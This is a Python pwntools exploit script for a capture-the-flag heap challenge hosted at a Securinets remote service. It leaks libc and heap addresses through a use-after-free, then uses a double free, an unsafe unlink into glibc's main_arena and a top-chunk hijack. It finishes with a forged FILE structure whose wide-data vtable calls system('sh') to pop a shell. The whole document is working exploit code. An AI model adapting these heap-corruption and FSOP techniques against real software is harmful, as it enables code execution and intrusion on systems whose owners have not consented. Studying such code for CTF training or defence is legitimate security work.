#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

        b*_IO_wfile_overflow
        c
        ''')
        sleep(1)

# nc pwn2.securinets.tn 7001
if args.REMOTE:
    p = remote('pwn2.securinets.tn', 7001)
else:
    p = process([exe.path])
GDB()

def alloc(idx, size, data=b""):
    sla(b"4. Exit", b"1")
    slna(b"Secret's index:", idx)
    slna(b"How big is your secret:", size)
    sla(b"content: " ,data)

def delete(idx):
    sla(b"4. Exit", b"2")
    slna(b"Secret's index:", idx)

def show(idx):
    sla(b"4. Exit", b"3")
    slna(b"Secret's index:", idx)
    ru(b"secret's content :")

alloc(0, 0x500, b"rrr")     
alloc(1, 0x100, b"fff")          
delete(0)    
show(0)

libc_leak = u64(r(6).ljust(8, b"\x00"))
libc.address = libc_leak - 0x1d1c68
info(f"libc leak: {hex(libc_leak)}")
info(f"libc base: {hex(libc.address)}")

alloc(0, 0x500, b"skippppp")    

# Free 2 chunks into smallbins to leak heap
alloc(0, 0x100, b"fd")      
alloc(1, 0x18, b"aaa")      
alloc(1, 0x100, b"bbb")         
delete(0)
alloc(0, 0x300, b"ahihi")       
delete(1)                                   

show(1)
heap_leak = u64(r(6).ljust(8, b"\x00")) 
heap_base = heap_leak - 0x620

info(f"heap leak: {hex(heap_leak)}")
info(f"heap base: {hex(heap_base)}")

# Empty the freed chunk
alloc(0, 0x100, b'1'*0x20)
alloc(1, 0x100, b'2'*0x20)

# Allocate fsop chunk for future use if needed
io = FileStructure()
io.flags = 0x3b01010101010101
io._IO_read_ptr = b'sh'
io._IO_write_ptr = heap_base+0x1000
io._IO_write_base = 0
io.chain = libc.sym._IO_2_1_stdout_
io.vtable = libc.sym._IO_wfile_jumps
io._lock = libc.sym._IO_stdfile_2_lock
io._wide_data = heap_base +0xc20 # check later

load = bytes(io)
load += flat(
    b'\0'*0xa0,
    p64(heap_base+0xca0),
    libc.sym.system
)

alloc(0, 0x2f8, load) # modify later

# Create 2 more chunk for heap layout
alloc(0, 0x100, b'3'*0x20)
alloc(1, 0x100, b'4'*0x20)

delete(0)

alloc(0, 0x200, b'guard'*10)

delete(1)

# Set up again for double free
alloc(0, 0x100, b'5'*0x20)

# Used for double free
alloc(1, 0x100, b'6'*0x20)

delete(0)

# free first
delete(1)

main_arena = libc.address + 0x1d1c60  
#####

load = bytearray(0x217)
load[0x108:0x110] = p64(0xf1)
load[0x1f8:0x200] = p64(0x21)

alloc(0, 0x218, load)
# second free
delete(1)

delete(0)

# ####

# Fake chunk inside heap -> heap overlap
# prepare for unsafe unlink
load = bytearray(0x217)
load[0x108:0x110] = p64(0xf1)
load[0x1f0:0x1f8] = p64(0xf0)                     
load[0x1f8:0x200] = p64(0x21)
load[0x110:0x118] = p64(main_arena + 0x10 - 0x18)   # FW
load[0x118:0x120] = p64(main_arena + 0x100 - 0x10)  # BK
# load[0x118:0x120] = p64(main_arena) 


"""
#define unlink(P, BK, FD) {                                            \
  FD = P->fd;                                                          \
  BK = P->bk;                                                          \
  if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                \
    malloc_printerr (check_action, "corrupted double-linked list", P); \
  else {                                                               \
    FD->bk = BK;                                                       \
    BK->fd = FD;                                                       \
  }
"""

# overwrite meta of victim
alloc(0, 0x218, load)
# Allocate victim for unsafe unlink
input("check")
alloc(0, 0xd8, b'bruh')

load = bytearray(0xe7)
load[0:8] = p64(main_arena + 0x830)
load[0x10:0x18] = p64(main_arena + 8)  
load[0x18:0x20] = p64(main_arena + 8)  

# Top chunk hijack inside main arena
input("Wait")
alloc(0, 0xe8, load)

load = bytearray(0x190)
input("check")

alloc(0, 0x170, b'')

input("check")
alloc(0, 0x400, p64(heap_base+0xb80))

sla(b'Exit', b'4')

p.interactive()